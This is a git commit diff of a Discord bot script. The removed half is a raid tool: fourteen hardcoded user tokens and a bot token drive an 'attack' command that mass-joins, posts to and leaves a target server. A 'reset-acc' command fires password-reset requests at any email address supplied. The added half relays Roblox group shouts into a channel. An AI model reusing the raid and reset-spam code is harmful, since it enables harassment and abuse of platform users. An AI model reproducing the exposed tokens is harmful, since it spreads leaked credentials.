55a3e5b737055a47de242e91c54f37334d657f51
TheLeaner <leanercracker@gmail.com>
2018-11-07 18:17:36 -0500

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,173 +1,63 @@
-var request = require('request');
 const Discord = require("discord.js");
 const client = new Discord.Client();
-/*
-var invite = "ewwJr7";
-var channel = "451432205839761419";
-var id = "298188468817887242";
-var proxy = "";
-*/
-var tokens = [
-"NDY4NjEyMDEzOTU5MTUxNjE2.Di7shg.flxYuSritE7EvRnp2r0IMhjwe2A",
-"NDY4NjI1Njg0MzAyOTIxNzQ4.Di75LQ.Ec5ExAMH8Bwie799lNWC966jgqk",
-"NDY4NjI1ODQ5MDM4NTM2NzE1.Di75VQ.UFaXYBDZsv9i8xsM4hAr3LwUYPA",
-"NDY4NjI2NDIyOTMyNTcwMTEy.Di753Q.FLcIQ1M2ADBBHmuaqfREBccxuW8",
-"NDY4NjI2NjgwMDkzNjA1OTA5.Di76Gw.BrwDKwYFcvWV8MaLdAlwlSWcH-w",
-"NDY4NjI2ODY5NTI5MzQ2MDQ4.Di76SA.R7mSsgrpZ_GOXJOZRMdT6OWx9hk",
-"NDY4NjI3MTQ5NzI1ODkyNjE5.Di76iw.71LbToUVfLpKmJu1NDgaQyd3aKg",
-"NDY4ODk0NTM4MTM2NTUxNDI2.Di_zog.tfbz39B9tw8Sz81XQm0yRuk2XkQ",
-"NDY4ODk0NzgzMTAwNjgyMjQx.Di_zzA.e8J2Ims1t_qKOMIfD5x_piagrEQ",
-"NDY4ODk1MDA5MTAyNjI2ODM2.Di_0AQ.gsU4Y-n-iPMFjOTf7VQtzdyETcI",
-"NDY4ODk1MTU0MDYxNzA1MjE4.Di_0JA.BewlNMx7Gjk9ULfJi5-N7JlrPPw",
-"NDY4ODk1MzExNTIwMzMzODI2.Di_0Sg.fSqEK--CiBMweVEMgnfZsEq_hic",
-"NDY4ODk1NDc2NTc0MzIyNzA4.Di_0cQ.CpGswvvkrv4OkSzlzz1QCswS27U",
-"NDY4ODk1NjM4MjEwMzQ3MDA4.Di_0lw.Vc1F63KL4bu3PiLCF989PW_f374"
-];
-
-
-function reqreset(eemail, method, url, form) {
-    console.log("Email: " + eemail + " Method: " + method + "")
-    return new Promise((resolve, reject) => {
-        request({
-            method: method,
-            url: url,
-            headers: {
-                email: eemail
-            },
-            form: form
-        }, (error, response, body) => {
-            if (error) return reject(error);
-            resolve(body);
-        });
+var DISCORD_TOKEN = process.env.TOKEN;
+var request = require('request');
+var lastShout = "";
+request("http://ro-api.000webhostapp.com/ro-api/lastShout.txt", function (error, response, body) {
+    lastShout = body
     });
-}
-
-function req(token, method, url, form) {
-    return new Promise((resolve, reject) => {
-        request({
-            method: method,
-            url: url,
-            headers: {
-                authorization: token
-            },
-            form: form
-        }, (error, response, body) => {
-            if (error) return reject(error);
-            resolve(body);
-        });
-    });
-}
-function attack(tkn, inv, chnl, srver){
-    console.log('Sent Join Request.')
-    req(tkn, "POST", "https://discordapp.com/api/v6/invite/" + inv).then(body => {
-        let parsed = JSON.parse(body);
-        console.log(inv,chnl,srver)
-    });
-    req(tkn, "POST", "https://discordapp.com/api/v6/channels/" + chnl + "/messages", {content: "the earth is round"}).then(body => {
-        req(tkn, "GET", "https://discordapp.com/api/v6/users/@me").then(body => {
-            let parsed = JSON.parse(body);
-            let sid = parsed["id"]
-            req(tkn, "DELETE", "https://discordapp.com/api/v6/users/@me/guilds/" + srver).then(body => {
-                console.log("Sent Leave Request.")
-            });
-    });
-});
-
-
-}
-
-
-function send(invite,channel,server){
-
-console.log("")
-    
-    tokens.forEach(function(death) {
-        attack(death, invite, channel, server);
-    });
-
-    
-
-}
-
-
-
-
-
-
-
-
-client.on("ready", () => {
-  console.log("I am ready!");
-});
-
-client.on("message", (message) => {
-    if (message.content.startsWith("reset-acc")) {
-        a = message.content.split(" ")
-        b = a[1]
-        reqreset(b, "POST", "https://discordapp.com/api/v6/auth/forgot")
-        message.channel.send("Request sent to: " + b + "\nPlease check your email.")
-    }
-})
-
-
-client.on("message", (message) => {
-  if (message.content.startsWith("attack")) {
-      a = message.content.split(" ")
-      b = a[1]
-      c = a[2]
-      d = a[3]
-      message.channel.send("Sent Bots to invite: " + b + " to the server ID of: " + c + " and the Channel ID of: " + d)
-      send(b,d,c).then(body => {
-     console.log(body)
-     message.channel.send(body) 
-    })
+function wait(milleseconds) {
+    return new Promise(resolve => setTimeout(resolve, milleseconds))
   }
+
+client.on("message", async function(message){
+
+if (message.content.startsWith("test")) {
+
+}
+
+
 });
-client.login("NDYxOTgyODIyNDYzMTc2NzI0.DjFRng.Vz2JY73qywctus5DlySAZJ40zdQ");
 
 
 
 
+client.on("ready", a => {
+function logEvery2Seconds(i) {
+    setTimeout(() => {
+        logEvery2Seconds(++i);
+    }, 2000)
+}
+logEvery2Seconds(0);
+let i = 0;
+setInterval(() => {
+    console.log('Waiting...')
+    request("http://ro-api.000webhostapp.com/ro-api/lastShout.txt", function (error, response, body) {
+        lastShout = body
+        });
+
+
+    request("https://groups.rprxy.xyz/v1/groups/4511209", function (error, response, body) {
+        body = JSON.parse(body)
+
+
+        if (lastShout == body["shout"]["body"]) {
+        console.log('Already last shout!')
+        } else {
+        console.log('Sending group shout message!')
+        client.guilds.get('509104083681148939').channels.get('509868150276358155').send("@here " + body["shout"]["body"] + " | https://www.roblox.com/My/Groups.aspx?gid=4511209")
+        url = ("http://ro-api.000webhostapp.com/ro-api/setShout.php?contents="+body["shout"]["body"]);
+        request(url, function (error, response, body) {
+        });
+
+
+        }
+        });
 
 
 
 
+}, 2000)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-/*
-
-Sorry, you can no have it yet ;(
-
-*/
-
-
-
-
-
-
-
-
+})
+client.login(DISCORD_TOKEN);
